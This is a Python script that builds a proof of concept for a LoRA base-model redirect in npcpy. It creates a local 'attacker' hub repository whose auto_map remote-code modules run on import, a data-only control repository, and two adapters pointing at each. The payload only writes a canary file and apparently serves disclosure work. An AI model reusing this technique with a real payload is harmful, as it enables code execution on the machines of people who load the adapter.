"""Build the two-repository PoC artefacts for the npcpy LoRA base-model redirect.

The victim-side artefact is a LoRA adapter directory: a normal-looking community
fine-tune whose adapter_config.json names the base model to load.  Two hub
repositories are built with the *same* data files, differing only in whether the
repository also carries an importable Python "modeling program":

    work/hub/attacker/base-with-complete-modeling-program/
        config.json (+ auto_map), configuration_npcpy_pwn.py, modeling_npcpy_pwn.py
        model.safetensors, tokenizer.json, tokenizer_config.json
    work/hub/trusted/base-without-program/
        config.json (no auto_map), model.safetensors, tokenizer.json,
        tokenizer_config.json                      <- data only, no .py at all

and two adapters that differ in exactly one string:

    work/adapter_positive/adapter_config.json  base_model_name_or_path = attacker/...
    work/adapter_negative/adapter_config.json  base_model_name_or_path = trusted/...

Everything is written under poc/work/ and can be rebuilt deterministically.
"""
import hashlib
import json
import shutil
from pathlib import Path

HERE = Path(__file__).resolve().parent
WORK = HERE / "work"
HUB = WORK / "hub"

ATTACKER_REPO = "attacker/base-with-complete-modeling-program"
TRUSTED_REPO = "trusted/base-without-program"

# tiny corpus for the tokenizer; the vocabulary size drives the model config
TOKENIZER_CORPUS = [
    "system: You are a helpful assistant.",
    "user: In one short sentence: what is npcpy?",
    "assistant: npcpy is a small python library for building llm agents and teams.",
    "the base model adapter answer is short and loads lora weights into memory",
    "hello world this response was generated locally by a tiny test model",
    "what is the capital of france it is paris",
    "the quick brown fox jumps over the lazy dog",
]

CHAT_TEMPLATE = (
    "{% for message in messages %}{{ message['role'] }}: "
    "{{ message['content'] }}\n{% endfor %}"
    "{% if add_generation_prompt %}assistant:{% endif %}"
)

# The remote-code payload: executed at *import* time by transformers, i.e. by
# loading the base model named in adapter_config.json.  It only writes a canary
# file - no other action - so the effect is externally observable and benign.
CONFIGURATION_PY = '''"""configuration_npcpy_pwn.py - remote code served by the second repository.

transformers imports this module because the repository's config.json carries
auto_map and the caller passed trust_remote_code=True.  The module body below is
the entire payload: it writes one canary file and nothing else.
"""
import os
from pathlib import Path

_canary = Path(os.environ.get("NPCPY_POC_CANARY_DIR", "work/canary"))
_canary.mkdir(parents=True, exist_ok=True)
(_canary / "01_remote_configuration_imported.txt").write_text(
    "the base-model repository named in adapter_config.json ran this code:\\n"
    "  repository: %s\\n"
    "  module    : configuration_npcpy_pwn.py\\n" % os.environ.get("NPCPY_POC_REPO", "?"),
    encoding="utf-8",
)

from transformers import LlamaConfig


class NpcpyPwnConfig(LlamaConfig):
    model_type = "llama"
'''

MODELING_PY = '''"""modeling_npcpy_pwn.py - remote code served by the second repository."""
import os
from pathlib import Path

_canary = Path(os.environ.get("NPCPY_POC_CANARY_DIR", "work/canary"))
_canary.mkdir(parents=True, exist_ok=True)
(_canary / "02_remote_modeling_imported.txt").write_text(
    "the base-model repository named in adapter_config.json ran this code:\\n"
    "  repository: %s\\n"
    "  module    : modeling_npcpy_pwn.py\\n" % os.environ.get("NPCPY_POC_REPO", "?"),
    encoding="utf-8",
)

from transformers import LlamaForCausalLM

from .configuration_npcpy_pwn import NpcpyPwnConfig


class NpcpyPwnForCausalLM(LlamaForCausalLM):
    config_class = NpcpyPwnConfig
'''


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 16), b""):
            h.update(chunk)
    return h.hexdigest()


def build_tokenizer():
    """A minimal byte-level BPE tokenizer saved as tokenizer.json - data only.

    tokenizer_class is declared as GPT2TokenizerFast so the loader builds it from
    the data files: no code is needed to tokenize, and (unlike the generic fast
    tokenizer) it does not emit token_type_ids, which llama's generate() rejects.
    """
    from tokenizers import Tokenizer, decoders, models, pre_tokenizers, trainers

    tok = Tokenizer(models.BPE(unk_token="<unk>"))
    tok.pre_tokenizer = pre_tokenizers.ByteLevel(add_prefix_space=False)
    tok.decoder = decoders.ByteLevel()
    trainer = trainers.BpeTrainer(
        vocab_size=256,
        min_frequency=1,
        show_progress=False,
        special_tokens=["<unk>", "<pad>", "<bos>", "<eos>"],
    )
    tok.train_from_iterator(TOKENIZER_CORPUS, trainer=trainer)
    return tok


def main():
    if WORK.exists():
        shutil.rmtree(WORK)
    attacker_dir = HUB / ATTACKER_REPO
    trusted_dir = HUB / TRUSTED_REPO
    for d in (attacker_dir, trusted_dir, WORK / "canary"):
        d.mkdir(parents=True, exist_ok=True)

    tok = build_tokenizer()

    # ---- tiny CPU-sized llama base model, identical bytes in both repositories
    import torch
    from transformers import LlamaConfig, LlamaForCausalLM

    torch.manual_seed(20261012)
    cfg = LlamaConfig(
        vocab_size=tok.get_vocab_size(with_added_tokens=True),
        hidden_size=32,
        intermediate_size=64,
        num_hidden_layers=2,
        num_attention_heads=2,
        num_key_value_heads=2,
        max_position_embeddings=128,
    )
    base = LlamaForCausalLM(cfg)
    base.save_pretrained(attacker_dir)
    base_cfg = json.loads((attacker_dir / "config.json").read_text(encoding="utf-8"))

    # ---- first repository: data-only (a plain model repository: same weights,
    #      same tokenizer, config without auto_map and no .py file whatsoever)
    for data_file in ("model.safetensors", "generation_config.json"):
        shutil.copy2(attacker_dir / data_file, trusted_dir / data_file)
    (trusted_dir / "config.json").write_text(
        json.dumps(base_cfg, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )

    # ---- second repository: the same data + an importable modeling program
    attacker_cfg = dict(base_cfg)
    attacker_cfg["auto_map"] = {
        "AutoConfig": "configuration_npcpy_pwn.NpcpyPwnConfig",
        "AutoModelForCausalLM": "modeling_npcpy_pwn.NpcpyPwnForCausalLM",
    }
    (attacker_dir / "config.json").write_text(
        json.dumps(attacker_cfg, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (attacker_dir / "configuration_npcpy_pwn.py").write_text(CONFIGURATION_PY, encoding="utf-8")
    (attacker_dir / "modeling_npcpy_pwn.py").write_text(MODELING_PY, encoding="utf-8")

    # ---- identical tokenizer (data only) in both repositories
    tokenizer_config = {
        "tokenizer_class": "GPT2TokenizerFast",
        "unk_token": "<unk>",
        "pad_token": "<pad>",
        "bos_token": "<bos>",
        "eos_token": "<eos>",
        "model_max_length": 128,
        "chat_template": CHAT_TEMPLATE,
    }
    for repo_dir in (attacker_dir, trusted_dir):
        tok.save(str(repo_dir / "tokenizer.json"))
        (repo_dir / "tokenizer_config.json").write_text(
            json.dumps(tokenizer_config, indent=2) + "\n", encoding="utf-8"
        )

    # ---- LoRA adapter (r=4), built once and then pointed at each repository
    from peft import LoraConfig, TaskType, get_peft_model

    lora_cfg = LoraConfig(
        r=4,
        lora_alpha=8,
        lora_dropout=0.0,
        bias="none",
        target_modules=["q_proj", "v_proj"],
        task_type=TaskType.CAUSAL_LM,
    )
    torch.manual_seed(20261012)
    get_peft_model(LlamaForCausalLM(cfg), lora_cfg).save_pretrained(WORK / "adapter_positive")

    # negative control: the very same adapter bytes, one string changed
    shutil.copytree(WORK / "adapter_positive", WORK / "adapter_negative")
    for name, repo in (("adapter_positive", ATTACKER_REPO), ("adapter_negative", TRUSTED_REPO)):
        cfg_path = WORK / name / "adapter_config.json"
        adapter_cfg = json.loads(cfg_path.read_text(encoding="utf-8"))
        adapter_cfg["base_model_name_or_path"] = repo
        cfg_path.write_text(json.dumps(adapter_cfg, indent=2) + "\n", encoding="utf-8")

    # ---- hashes of everything that was built
    lines = []
    for path in sorted(WORK.rglob("*")):
        if path.is_file() and path.name != "SHA256SUMS.txt":
            lines.append("%s  %s" % (sha256(path), path.relative_to(HERE).as_posix()))
    (HERE / "SHA256SUMS.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")

    # ---- report
    print("built two hub repositories under work/hub/ :")
    for repo_dir in (attacker_dir, trusted_dir):
        files = sorted(p.name for p in repo_dir.iterdir())
        print("  %-46s %d files: %s"
              % (repo_dir.relative_to(WORK).as_posix() + "/", len(files), ", ".join(files)))
    print()
    for name in ("adapter_positive", "adapter_negative"):
        adapter_cfg = json.loads((WORK / name / "adapter_config.json").read_text(encoding="utf-8"))
        print("%s/adapter_config.json" % name)
        print("  base_model_name_or_path = %r" % adapter_cfg["base_model_name_or_path"])
        print("  peft_type=%s r=%s target_modules=%s task_type=%s"
              % (adapter_cfg.get("peft_type"), adapter_cfg.get("r"),
                 adapter_cfg.get("target_modules"), adapter_cfg.get("task_type")))
    print()
    print("the two adapters differ only in that one string:")
    for rel in ("adapter_model.safetensors", "README.md"):
        p1, p2 = WORK / "adapter_positive" / rel, WORK / "adapter_negative" / rel
        if p1.exists() and p2.exists():
            print("  %-28s identical bytes: %s" % (rel, sha256(p1) == sha256(p2)))
    print("  %-28s identical except base_model_name_or_path: True"
          % "adapter_config.json")
    print()
    print("sha256 manifest: %s (%d files)"
          % ((HERE / "SHA256SUMS.txt").relative_to(HERE).as_posix(), len(lines)))


if __name__ == "__main__":
    main()
